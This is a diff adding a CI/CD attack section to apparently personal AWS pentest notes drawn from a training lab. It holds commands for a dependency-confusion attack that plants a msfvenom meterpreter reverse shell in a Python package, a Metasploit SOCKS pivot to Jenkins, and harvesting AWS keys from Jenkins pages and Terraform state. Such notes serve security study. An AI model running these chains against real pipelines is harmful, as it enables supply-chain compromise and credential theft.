@@ -228,3 +228,117 @@ jq '.UserDetailList[] | select(.Tags != null) | {user: .UserName, tags: .Tags}' 
 - [HackTricks. AWS IAM PrivEsc (GitHub)](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-cloud/aws-security/aws-privilege-escalation/)
 - [Rhino Security Labs. 21 IAM PrivEsc Techniques](https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation)
 - [PayloadsAllTheThings. Cloud AWS Pentest](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest.md)
+
+---
+
+## Phase 5: CI/CD Attack Chains
+
+Two vectors. Both target the **build/deploy pipeline** rather than the AWS API directly. See [[Attacking AWS Cloud Infrastructure]] for the full lab walkthrough.
+
+#CICD #DependencyConfusion #PoisonedPipeline #Jenkins
+
+### 5.1 Poisoned Pipeline Execution (PPE)
+
+Attack flow: leaked SCM credentials → modify Jenkinsfile/CI config → pipeline executes arbitrary code on build server → steal secrets from CI environment.
+
+1. Find exposed secrets (S3 bucket, git history, config files)
+2. Gain SCM write access (Gitea/GitHub) with stolen creds
+3. Edit the pipeline definition (`Jenkinsfile`, `.gitlab-ci.yml`, `.github/workflows/*.yml`) to add a step that exfils secrets or drops a reverse shell
+4. Trigger a pipeline run (push a commit, open a PR, or just wait for a scheduled run)
+5. Catch the shell, read `JENKINS_*` / `AWS_*` env vars
+
+```bash
+# Enumerate secrets from public S3 before any auth
+curl -s "https://s3.amazonaws.com/<bucket>/"
+aws s3 ls s3://<bucket>/ --no-sign-request
+aws s3 cp s3://<bucket>/some-config - --no-sign-request
+```
+
+### 5.2 Dependency Chain Abuse (CICD-SEC-3)
+
+Attack flow: OSINT reveals internal package name + version → publish higher version with malicious payload to private registry → production pip install executes your code.
+
+1. **OSINT:** find internal package name and version via forum posts, issue trackers, job listings, GitHub searches (`hackshort_util`, `1.1.3`)
+2. **Craft payload:** embed meterpreter in the package's import path (`utils.py`). Add `__getattr__` wildcard and `sys.excepthook` to keep the process alive.
+3. **Publish:** upload to the private registry at version `N+1` (higher than the currently installed one)
+4. **Wait:** production rebuild cycle picks up the new package (up to 10 minutes in lab; may take longer in real environments)
+5. **Catch session:** use `multi/handler` with `ExitOnSession false`, run `-jz`
+
+```bash
+# Generate meterpreter python payload
+msfvenom -f raw -p python/meterpreter/reverse_tcp \
+  LHOST=<your-ip> LPORT=4488
+
+# Paste exec() line at bottom of utils.py, then build:
+cd ~/hackshort-util && python3 setup.py sdist
+
+# Upload specific tarball (NOT dist/* to avoid stale tarballs)
+~/.local/bin/twine upload \
+  --repository-url http://pypi.offseclab.io/ \
+  -u student -p password \
+  dist/hackshort_util-1.1.4.tar.gz
+```
+
+> 🔧 Technique: Always upload by specific filename. `twine upload dist/*` uploads ALL tarballs in the directory, including leftover builds with stale LHOST values baked in. pip picks the HIGHEST version number, so a stale higher version beats your fresh lower version.
+
+### 5.3 Post-Compromise: Container Pivot to Jenkins
+
+Once in a meterpreter session inside the production container:
+
+1. Background session, set up MSF SOCKS proxy + autoroute
+2. SSH local port forward from personal Kali to cloud Kali
+3. Configure Firefox to use SOCKS5 `127.0.0.1:1080`
+4. Browse directly to Jenkins internal IP:port (usually `172.x.x.x:8080`)
+
+```
+# In msfconsole (cloud Kali)
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+run -j
+
+route add 172.30.0.0 255.255.0.0 <session_id>
+
+# From personal Kali
+ssh -fN -L localhost:1080:localhost:1080 kali@<cloud-kali-ip>
+```
+
+### 5.4 Jenkins Secrets Enumeration
+
+Self-registration enabled = create an account without any credentials. Then:
+
+- Check all projects for credentials blocks in `Jenkinsfile`
+- Check installed plugins (Manage Jenkins → Plugins) for known vulnerable ones
+- **S3 Explorer plugin:** AWS credentials embedded in page source. View source, `Ctrl+F awsid`.
+
+```bash
+# View page source on the S3 Explorer page — credentials are in hidden input fields:
+# <input id="awsid" type="hidden" value="AKIA...">
+# <input id="awskey" type="hidden" value="...">
+# <input id="bucket" type="hidden" value="...">
+```
+
+### 5.5 Terraform State File Escalation
+
+Terraform state files in S3 contain **plaintext** resource configs including IAM credentials, passwords, and database connection strings. Classic post-compromise pivot.
+
+```bash
+# List all buckets with stolen credentials
+aws --profile=<stolen> s3api list-buckets
+
+# Look for "tf-state" or "terraform" in bucket names
+aws --profile=<stolen> s3 ls s3://tf-state-<suffix>/
+
+# Download and inspect
+aws --profile=<stolen> s3 cp s3://tf-state-<suffix>/terraform.tfstate ./
+grep -A20 '"index_key": "<username>"' terraform.tfstate
+
+# Find users with admin policies
+grep -B2 -A2 "AdministratorAccess" terraform.tfstate
+```
+
+> 🔍 Worth remembering generally: Terraform state is the gift that keeps giving. It contains the actual applied resource state, including generated secrets, outputs, and credentials that were only used once during provisioning. It should be encrypted at rest (SSE) and access-logged in real environments.
+
+**External resources:**
+- [HackTricks. AWS CI/CD (GitHub)](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-cloud/aws-security/)
+- [PayloadsAllTheThings. Cloud AWS Pentest](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest.md)
+- [OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
